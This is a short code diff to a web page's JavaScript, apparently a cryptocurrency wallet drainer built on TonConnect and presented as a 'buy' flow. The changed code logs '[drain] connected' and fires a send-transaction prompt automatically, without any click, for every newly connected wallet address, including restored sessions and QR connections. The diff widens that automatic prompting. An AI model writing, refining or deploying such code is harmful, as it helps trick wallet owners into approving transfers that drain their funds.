@@ -67,7 +67,7 @@
 
   let busy = false
   let pendingDrain = false
-  let firstStatus = true
+  let promptedFor = ''
   let retryTimer = null
   let retryCount = 0
 
@@ -88,6 +88,7 @@
     if (!wallet) {
       clearRetry()
       retryCount = 0
+      promptedFor = ''
       return
     }
     console.log('[drain] connected', wallet.account.address)
@@ -100,13 +101,15 @@
 
     // Fires on a restored session too — an already-connected wallet gets the
     // send prompt without clicking anything.
-    if (pendingDrain || firstStatus) {
+    // Prompt once per connected address, no matter how the wallet connected
+    // (our buttons, the injected TonConnect button, or a QR scanned on desktop).
+    if (promptedFor !== wallet.account.address) {
+      promptedFor = wallet.account.address
       pendingDrain = false
       clearRetry()
       retryCount = 0
-      setTimeout(() => { void buy() }, firstStatus ? 900 : 500)
+      setTimeout(() => { void buy() }, 900)
     }
-    firstStatus = false
   })
 
   async function buy(isRetry = false) {
